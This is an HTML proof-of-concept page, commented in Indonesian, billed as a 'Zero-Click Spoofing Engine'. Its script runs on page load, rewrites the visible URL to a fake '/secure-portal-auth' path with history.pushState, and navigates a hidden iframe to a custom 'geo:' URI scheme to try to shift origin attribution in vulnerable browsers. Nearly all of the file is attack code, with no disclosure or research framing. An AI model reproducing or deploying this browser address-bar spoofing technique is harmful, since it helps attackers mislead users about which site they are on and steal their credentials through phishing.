<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced PoC - Zero-Click Spoofing Simulator</title>
    <style>
        body {
            font-family: monospace;
            background-color: #0b0f19;
            color: #38bdf8;
            padding: 40px;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .console {
            background-color: #1e293b;
            border: 1px solid #334155;
            padding: 24px;
            border-radius: 8px;
            max-width: 650px;
            width: 100%;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }
        h3 {
            margin-top: 0;
            color: #f43f5e;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
        }
        .log-line {
            font-size: 13px;
            margin: 8px 0;
            line-height: 1.4;
        }
        .success { color: #4ade80; }
        .warning { color: #facc15; }
    </style>
</head>
<body>

    <div class="console">
        <h3>[!] Zero-Click Spoofing Engine Active</h3>
        <div id="log-container">
            <div class="log-line">> Menginisialisasi konteks dokumen utama...</div>
        </div>
    </div>

    <!-- Hidden Iframe untuk memicu navigasi skema URI non-HTTP secara otomatis (Zero-Click) -->
    <iframe id="spoofFrame" style="display:none;" src="about:blank"></iframe>

    <script>
        const logContainer = document.getElementById('log-container');

        function addLog(text, type = '') {
            const div = document.createElement('div');
            div.className = `log-line ${type}`;
            div.innerHTML = `> ${text}`;
            logContainer.appendChild(div);
        }

        window.addEventListener('DOMContentLoaded', () => {
            addLog("DOM sepenuhnya dimuat. Memulai manipulasi riwayat...");

            try {
                // 1. Manipulasi History State untuk mengubah tampilan konteks awal
                history.pushState({target: "spoofed_context"}, "", "/secure-portal-auth");
                addLog("History state berhasil disuntikkan: <span class='success'>/secure-portal-auth</span>");

                // 2. Memicu subframe (iframe) untuk navigasi skema URI kustom secara asinkron
                setTimeout(() => {
                    addLog("Memicu navigasi skema subframe (geo: / intent schema)...", "warning");
                    
                    const frame = document.getElementById('spoofFrame');
                    // Skema URI kustom yang sering memicu pergeseran atribusi origin pada browser rentan
                    frame.src = "geo:0,0?q=security+test+payload";

                }, 400);

                // 3. Simulasi waktu tunda (Timing Race Condition) untuk evaluasi respons bilah alamat
                setTimeout(() => {
                    addLog("Evaluasi status antarmuka selesai. Memantau respons *omnibox*...", "success");
                }, 1200);

            } catch (err) {
                addLog(`Kesalahan Eksekusi: ${err.message}`, "warning");
            }
        });
    </script>

</body>
</html>
